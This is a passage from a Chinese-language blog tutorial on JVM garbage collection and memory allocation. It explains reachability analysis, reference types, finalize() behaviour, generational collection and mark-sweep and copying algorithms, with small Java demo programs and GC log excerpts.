    <url>//post/JVM/3_%E5%9E%83%E5%9C%BE%E6%94%B6%E9%9B%86%E5%99%A8%E4%B8%8E%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E7%AD%96%E7%95%A5.html</url>
    <content><![CDATA[<h1 id="垃圾收集器与内存分配策略"><a href="#垃圾收集器与内存分配策略" class="headerlink" title="垃圾收集器与内存分配策略"></a>垃圾收集器与内存分配策略</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>我们先提出三个问题：</p>
<blockquote>
<p>哪部分内存需要回收?</p>
<p>什么时候进行回收？</p>
<p>如何进行回收？</p>
</blockquote>
<h2 id="生存还是死亡？"><a href="#生存还是死亡？" class="headerlink" title="生存还是死亡？"></a>生存还是死亡？</h2><h3 id="where"><a href="#where" class="headerlink" title="where"></a>where</h3><p>​    我们都知道在Java中，栈，本地方法区，程序计数器都是线程私有的，随着线程的创建和结束，内存也会自动的分配和销毁，执行的方法也随着栈帧的插入和弹出而创建和销毁。所以这部分区域我们不必担心。</p>
<p>​    而方法区（元空间）和堆空间，是线程共享的，这部分区域的内存就是我们需要去进行垃圾回收的区域。</p>
<h3 id="when"><a href="#when" class="headerlink" title="when"></a>when</h3><p>​    什么时候进行垃圾回收，就需要我们判断这个对象是否仍被引用，如果没有一个指针指向它，那我们就可以放心的进行垃圾回收，如果仍被引用，那就不行（你杀根本干嘛，这人我正用着呢），关于对象引用判断分为两种：</p>
<h4 id="引用计数法"><a href="#引用计数法" class="headerlink" title="引用计数法"></a>引用计数法</h4><p>​    就是说一个人引用，就对一个引用计数器加一，如果这个人不引用了，我们就减一，当引用计数器等于0的时候，我们就可以判定，可以被垃圾清理了。</p>
<blockquote>
<p>该方法易理解，且实现简单。但一个缺点就是遇到循环依赖，不好处理。在主流的java虚拟机中都没有使用该方法进行判断。下面用代码进行说明。</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> referenceCountingGC <span class="token punctuation">&#123;</span>
  <span class="token class-name">Object</span> instance <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
  <span class="token comment">/**
   * 这里创建一个字节数组只是为了，占一些内存，方便后面看GC情况。
   */</span>
  <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> _1mb <span class="token operator">=</span> <span class="token number">1024</span><span class="token operator">*</span><span class="token number">1024</span><span class="token punctuation">;</span>
  <span class="token keyword">private</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bigSize <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>_1mb<span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token comment">/**
   * -XX:+PrintGCDetails 
   * 输出GC详情
   * @param args
   */</span>
  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    referenceCountingGC <span class="token class-name">A</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">referenceCountingGC</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    referenceCountingGC <span class="token class-name">B</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">referenceCountingGC</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">A</span><span class="token punctuation">.</span>instance <span class="token operator">=</span> <span class="token class-name">B</span><span class="token punctuation">;</span>
    <span class="token class-name">B</span><span class="token punctuation">.</span>instance <span class="token operator">=</span> <span class="token class-name">A</span><span class="token punctuation">;</span>

    <span class="token class-name">A</span><span class="token operator">=</span><span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token class-name">B</span><span class="token operator">=</span><span class="token keyword">null</span><span class="token punctuation">;</span>

    <span class="token comment">/**
     * [Full GC (System.gc()) 
     * [PSYoungGen: 496K->0K(38400K)]
     * [ParOldGen: 8K->424K(87552K)]
     * 504K->424K(125952K
     * ), [Metaspace: 3208K->3208K(1056768K)],
     * 0.0135739 secs] [Times: user=0.01 sys=0.00, real=0.01 secs] 
     * 
     * 我们看到即使两个对象相互引用，但JVM还是进行回收了，侧面反映出JVM没有使用
     * 引用技术法来判断对象是否存活
     */</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">gc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="可达性分析法"><a href="#可达性分析法" class="headerlink" title="可达性分析法"></a>可达性分析法</h4><p>​    简单来说我们将对象之间相互的引用想象成一个树结构，其中根对象为<code>GC roots</code>(有一系列的根对象)，树结构中节点与节点之间形成链，当我们寻找一个对象时，从GC roots往下走，该路径为<code>引用链</code>,如果一个对象无法在引用链中找到，就是不可达的，我们就对可以进行垃圾回收。</p>
<p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hefu2sk4j313s0skjuh.jpg" alt="image-20220623095217493"></p>
<p>​        这里我们可以看到虽然object5,object6,object7之间相互引用，但是在引用链外，所以也是要判定为需要垃圾回收的。</p>
<blockquote>
<p>有哪些可以对象可作为GC roots呢？</p>
</blockquote>
<ol>
<li>在虚拟机栈（局部变量表）中引用的对象，也就是当前方法正在使用的参数，局部变量，临时变量。</li>
<li>方法区中静态属性引用对象。（类的引用型静态变量）</li>
<li>方法区中常量引用对象。譬如字符串常量池中引用的对象。</li>
<li>本地方法栈中JNI（Native方法）引用对象</li>
<li>Java虚拟机内部引用对象，如基本数据类型对应的Class对象，一些异常对象，类加载器对象。</li>
<li>被同步锁持有的对象</li>
<li>反映Java虚拟机内部情况的JMXBean，JVMTI中注册的回调，本地代码缓存。</li>
</ol>
<p>除了上述固定的GC Roots集合外，根据用户所选的<code>垃圾回收器</code>以及<code>当前回收的内容区域</code>不同，还有其他对象<code>临时</code>加入，共同构建GC Roots集合。比如：分代收集，局部回收。</p>
<h4 id="再谈引用"><a href="#再谈引用" class="headerlink" title="再谈引用"></a>再谈引用</h4><p>​    最初在JKD1.2版本之前，引用的概念就是<code>引用与非引用</code>，但现在我们希望能够再细分一些，比如一些对象我们希望在内存足够时，你就继续待着，如果内存不够了，那我们就清理掉(这么看与裁员是一样的)。很多系统的缓存功能都符合这样的应用场景。</p>
<p>​    在JDK1.2后，Java对引用的概念进行扩充，分为<code>强引用，软引用，弱引用，虚引用</code></p>
<ul>
<li>强引用就是最原始的概念<code>Object o1 = new Object()</code>,只要强引用关系还在，就不会清除</li>
<li>软引用是指一些有用，但非必要的对象，在系统放生内存溢出前，将这些对象放入回收范围之中，进行第二次的回收，如果这次回收没有足够的内存，就会抛出内存溢出异常，java中使用<code>SoftReference类</code>实现软引用。</li>
<li>弱引用指分必要对象，只会撑到下次垃圾回收之前，无论内存够不够，都会清理，java中使用<code>WeekReference类</code>实现</li>
<li>虚拟用（幽灵引)一个对象有没有虚引用都不影响是否被清理，它的作用是指当清理时，系统收到一个通知。java中使用<code>PhantomReference类</code>实现</li>
</ul>
<h3 id="how"><a href="#how" class="headerlink" title="how"></a>how</h3><p>​    当进行可达性分析后，一个对象被判定为不可达，也不是非死不可，第一次判断完后，该对象被一次标记，现在可以算的上<code>缓期</code>，随后再进行一次筛选，<strong>判断此对象是否有必要执行finalize()方法？</strong></p>
<blockquote>
<p>如果对象没有覆盖finalize()方法，或者finalize()方法已经被执行了，就判定为<code>没必要执行</code></p>
</blockquote>
<p>​    如果该对象被判定为有必要执行执行finalize()方法，对象会被放到<code>F-Queue</code>的队列中，随后一条由虚拟机创建的，低调低优先级的Finalizer线程会去执行他们的finalize()方法，这里的执行时指启动finalize()方法，并不一定等待到运行结束，因为如果finalize()执行缓慢，甚至发生死循环，则其他对象无法被删除，可能导致内存回收子系统的崩溃，finalize()是最后一次救自己的机会，随后还会有第二次标记，只要在这之前，将自己与引用链上重新关联，那再第二次标记时就会踢出<code>即将回收的队列</code>，如果这个时候还没逃走，那就得被清理了。下面用代码演示：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FinalizeEscapeGC</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">FinalizeEscapeGC</span> <span class="token constant">SAVE_HOOK</span><span class="token operator">=</span><span class="token keyword">null</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span>  <span class="token function">isAlive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"yes i am still alive"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">finalize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Throwable</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">finalize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"finalize method executed !"</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//进行自救</span>
        <span class="token class-name">FinalizeEscapeGC</span><span class="token punctuation">.</span><span class="token constant">SAVE_HOOK</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"进行自救："</span><span class="token operator">+</span><span class="token class-name">FinalizeEscapeGC</span><span class="token punctuation">.</span><span class="token constant">SAVE_HOOK</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">FinalizeEscapeGC</span> escapeGC <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FinalizeEscapeGC</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"创建的对象："</span><span class="token operator">+</span>escapeGC<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        escapeGC <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token comment">//第一次成功救出自己</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">gc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//因为  Finalizer方法优先级低，我们等一下</span>
        <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">FinalizeEscapeGC</span><span class="token punctuation">.</span><span class="token constant">SAVE_HOOK</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">FinalizeEscapeGC</span><span class="token punctuation">.</span><span class="token constant">SAVE_HOOK</span><span class="token punctuation">.</span><span class="token function">isAlive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"i am dead"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token comment">//下面代码和上面一样</span>
        <span class="token class-name">FinalizeEscapeGC</span><span class="token punctuation">.</span><span class="token constant">SAVE_HOOK</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">gc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//因为  Finalizer方法优先级低，我们等一下</span>
        <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">FinalizeEscapeGC</span><span class="token punctuation">.</span><span class="token constant">SAVE_HOOK</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">FinalizeEscapeGC</span><span class="token punctuation">.</span><span class="token constant">SAVE_HOOK</span><span class="token punctuation">.</span><span class="token function">isAlive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"i am dead"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    运行后我们发现第一次gc后，该对象还存活，因为第一次执行了finalize()方法时，我们将对象本身赋值给了类变量，但是当第二次gc时，对象就彻底清除了，因为finalize()只执行一次。</p>
<blockquote>
<p>最后声明一点，不要使用finalize()来拯救对象，官网也不推荐，只是在这里让大家知道它是干嘛的就行了。</p>
</blockquote>
<h3 id="回收方法区"><a href="#回收方法区" class="headerlink" title="回收方法区"></a>回收方法区</h3><p>​    在《Java虚拟机规范》中并未要求堆方法区实现垃圾回收，所以有的虚拟机版本确实没有回收方法区，而且方法区回收也是比较苛刻的。</p>
<p>​    方法区垃圾回收主要回收两类：废弃的常量，类型信息。</p>
<blockquote>
<p>常量的垃圾回收和上面的类似，主要判断一个类型是否不再被使用比较苛刻，需要满足下面三点：</p>
</blockquote>
<ol>
<li>该类所有实例，包括派生子类的实例都已经被回收。</li>
<li>加载该类的类加载被回收了。</li>
<li>该类对应的java.lang.Class对象没有被任何引用。</li>
</ol>
<blockquote>
<p>满组上面三点，也不一定被回收，下面介绍一些相关虚拟机参数：</p>
</blockquote>
<ol>
<li>-Xnoclassgc 控制是否对类型回收。</li>
<li>-verbose:class -XX:+TraceClassLoading查看类加载和卸载信息(需要Product版虚拟机)</li>
<li>-XX:+TraceClassUnLoading(需要FastDebug版虚拟机)</li>
</ol>
<blockquote>
<p>什么时候需要回收方法区？</p>
</blockquote>
<p>​    在大量使用反射，动态代理，CGLib等字节码框架，会动态创建很多类，通常都需要Java虚拟机具有类型卸载的能力。保证不会堆方法区有太大的压力</p>
<hr>
<h2 id="垃圾收集算法"><a href="#垃圾收集算法" class="headerlink" title="垃圾收集算法"></a>垃圾收集算法</h2><p>​    在上面我们已经知道判定一个对象是否会被回收可通过<code>引用计数式</code>和<code>追踪式(可达性分析)</code>两种算法，而引用计数式在主流的垃圾回收策略中都没使用，所以我们下面讨论的还是追踪式算法。</p>
<blockquote>
<p>第一个问题：我们每次都是直接对整个堆进行可达性分析和垃圾回收吗？</p>
</blockquote>
<p>​    不可行，这会导致消耗大量的时间。大多数的垃圾回收都遵从“分代收集”的理论进行设计，而它是建立在两个分代假说上的。</p>
<p>​    &gt; 若分代假说：绝大多数对象都是朝生夕死的</p>
<p>​    &gt; 强分代假说：熬过越多次垃圾回收的对象，越难以消亡</p>
<p>​    这两个分代假说共同奠基了一个设计原则：收集器应该将Java堆划分出不同的区域。通俗的讲我们把<code>新生对象</code>放在一起，把<code>老不死的(戏称)</code>放在一起，通过回收对象的年龄（熬过的回收次数）放在不同的区域，每次只针对<code>新生代</code>进行垃圾回收，<code>老年代</code>偶尔进行一次回收。针对不同的区域收集，也就有了<code>Minor GC ,Major GC ,Full GC</code>回收类型的划分。</p>
<p>​    在划分区域后，根据不同区域以及区域内元素的特点，我们使用不同的<code>垃圾收集算法</code>，且他们都是基于分代收集理论。后面我们会详细说明。</p>
<p>​    &gt; 标记-清除算法</p>
<p>​    &gt; 标记-复制算法</p>
<p>​    &gt; 标记-整理算法</p>
<blockquote>
<p>第二个问题：对象不是孤立存在的，如果对象之间存在跨代引用怎么办？</p>
</blockquote>
<p>​    当我们针对新生代垃圾回收时，因为存在跨代引用，我们还得遍历老年代保证可达性分析结果的正确。这肯定也会对内存回收带来负荷，为了解决这个问题，我们对分代收集理论添加第三条经验法则：</p>
<p>​    &gt; 跨代引用假说：跨代引用相比同代引用要少的多。</p>
<p>​    其实根据前面法则，我们也能知道如果针对存在跨代引用，那么新生代的对象在经历过多轮垃圾回收后，也会被放到老年代的，这样问题就解决了，<strong>但在之此前我们怎么减少对老年代分析的性能消耗？</strong>，我们可以依据跨代引用假说，我们就可以不用对整个老年代进行扫描，只需要在新生代上建立一个全局的数据结构(记忆集，Remembered Set)，这个结构把老年代划分成若干个小块儿，标识出老年代的哪一块儿内存存在跨代引用，这样每次对新生代垃圾回收时，只用把老年代这片内存的对象加入到GC Roots即可。虽然在对象改变关系时维护数据的准确性，但比起扫描整个老年区还是划算的。</p>
<blockquote>
<p>这里我们需要确定一些回收类型的概念</p>
<blockquote>
<p>部分收集（Partial GC）：目标不是完整的收集整个Java堆，其中又细分为：</p>
<blockquote>
<p>新生代收集(Minor GC)：只收集新生代</p>
<p>老年代收集(Major GC)：只收集老年代，只有CMS收集器有单独收集老年代的行为(这里有一些概念上的混淆，有人会把Major GC 和 Full GC混淆，需要我们自己判断说的到底是哪个)</p>
<p>混合收集(Mixed GC)：收集新生代和部分老年代，目前只有G1收集器有</p>
</blockquote>
<p>整堆收集（Full GC）：收集整个堆区域和方法区</p>
</blockquote>
</blockquote>
<h3 id="标记-清除算法"><a href="#标记-清除算法" class="headerlink" title="标记-清除算法"></a>标记-清除算法</h3><p>​    这是一个最早期最基础的算法，也就是我们先标记哪些对象需要清除，然后再统一进行清理，当然我们也可以只标记哪些需要保留，将没有标记的进行统一的清理，但是这个算法存在两个问题：</p>
<ol>
<li>执行效率不稳定：如果有大量对象需要清理或者大量对象需要留下，那我们在标记和清除上花的时间就越多。</li>
<li>内存空间碎片化问题，也就是说在我们标记，清除后会产生大量不连续的内存碎片，当后面再分配大对象时，无法分配到空间，而再进行一次GC。</li>
</ol>
<p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hefugyq0j30t00ig75n.jpg" alt="image-20220624100645632"></p>
<h3 id="标记-复制算法"><a href="#标记-复制算法" class="headerlink" title="标记-复制算法"></a>标记-复制算法</h3><p>​    也被称为复制算法，最初理论为内存按照容量分成1:1两块，每次只使用一块儿，当一块儿不够用时，在分析后，将保留的对象标记并复制到另一半区域，移动堆顶指针，按照顺存放，然后直接清除之前的区域。这样就不用担心空间零散的碎片。不过<strong>缺点也很明显</strong>，你直接分一半，也太浪费空间了，导致频繁的标记复制。<img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hefux99ij30gr0a874p.jpg" alt="image-20220624122757393"></p>
<p>​    后面又进行了一次优化：<code>Appel式回收</code>，新生代分为一个较大的<code>Eden区域</code>，和两个较小的<code>Survivor区</code>,默认比例为8:1:1,也就是每次我们只使用Eden区和一个Survivor区，当垃圾回收时，将保留的对象都放在另一个Survivor区域，然后直接堆之前的区域清理。</p>
<blockquote>
<p>第三个问题：那假如这次清理完，发现有大量的对象需要保存，但是一个Survivor区不够，怎么办？</p>
</blockquote>
<p>​    这里就设计了一个安全设计，当一个Survivor区不够，就需要使用老年代来做分配担保，将这些对象（超出的部分）直接交给老年代。不过我们最好还是用代码测试一下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> demo <span class="token punctuation">&#123;</span>
        <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a1<span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a2<span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a3<span class="token punctuation">;</span>
    <span class="token comment">/**
     * -XX:NewSize=10485760—新生代大小为10m
     * -XX:MaxNewSize=10485760—新生代最大大小为10m
     * -Xms20M—初始堆大小为20m
     * -Xmx20M—最大堆大小为20m
     * -XX:+UseParNewGC：新生代使用ParNewGC垃圾回收器
     * -XX:+UseConcMarkSweepGC---老年代使用CMS
     * -XX:+PrintGCDetails---打印GC详细日志
     * -XX:+PrintGCTimeStamps—打印GC时间
     * -XX:SurvivorRatio=8—设置eden区和survivor区的比例为8:1:1
     * -XX:PretenureSizeThreshold=10485760—设置最大对象的阈值为10m
     *
     * @param args
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">/**
         * 当前为6m时，可以将对象全部放在eden区
         * par new generation   total 9216K, used 8000K
         * eden space 8192K,  97% used
         * from space 1024K,   0% used
         * concurrent mark-sweep generation total 10240K, used 0K
         */</span>
        a1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//1m</span>

        <span class="token comment">/**
         * 可以发现当再添加189k时,发生了第一次gc，
         * 如果Survivor区放不下存活对象，存活对象并不是全都进入老年代，而是部分对象进入老年代，部分对象继续被分配到Survivor区
         * par new generation   total 9216K, used 720K
         * eden space 8192K,   1% used
         * from space 1024K,  62% used
         * concurrent mark-sweep generation total 10240K, used 6146K
         */</span>
        a2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">189</span><span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token comment">//直接分配一个5m的对象，由于eden区只有8m，之前已经分配了的再加上一些未知对象也会占据一定的内存空间，此时必然会引起新生代gc</span>
        a3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">5</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//5m</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    可以发现在上面的实验情况与我们想象的并不一样，结论就是：<code>如果Survivor区放不下存活对象，存活对象并不是全都进入老年代，而是部分对象进入老年代，部分对象继续被分配到Survivor区。</code>下面还有一种情况我们用代测试：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> demo2 <span class="token punctuation">&#123;</span>
    <span class="token comment">/**
     * 此时从红框中的信息可以清晰的发现，from区被占用率为0%，
     * 而老年代空间则被使用了26m左右，存活对象还是25m，逻辑没变，
     * 那么这情况就可以表明25m对象在新生代gc后都进入了老年代。
     * 
     * 
     * 结论：新生代gc后，如果触发了老年代gc，即使survivor区放的下部分存活对象，对象也会全部进入老年代。
     * @throws InterruptedException
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">loadData</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">//一开始我们就分配了80m，相当于一个eden区</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data0 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">80</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        data0 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token comment">//请求40m</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">//每个请求10m</span>
            data <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">10</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        data <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">5</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">10</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">10</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        data3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">10</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        data3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">10</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">/**
     * -XX:NewSize=104857600—新生代大小为100m
     * -XX:MaxNewSize=104857600—新生代最大大小为100m
     * -Xms200M—初始堆大小为200m
     * -Xmx200M—最大堆大小为200m
     * -XX:+UseParNewGC：新生代使用ParNewGC垃圾回收器
     * -XX:+UseConcMarkSweepGC---老年代使用CMS
     * -XX:+PrintGCDetails---打印GC详细日志
     * -XX:+PrintGCTimeStamps—打印GC时间
     * -XX:SurvivorRatio=8—设置eden区和survivor区的比例为8:1:1
     * -XX:PretenureSizeThreshold=104857600—设置最大对象的阈值为100m
     * @param args
     * @throws InterruptedException
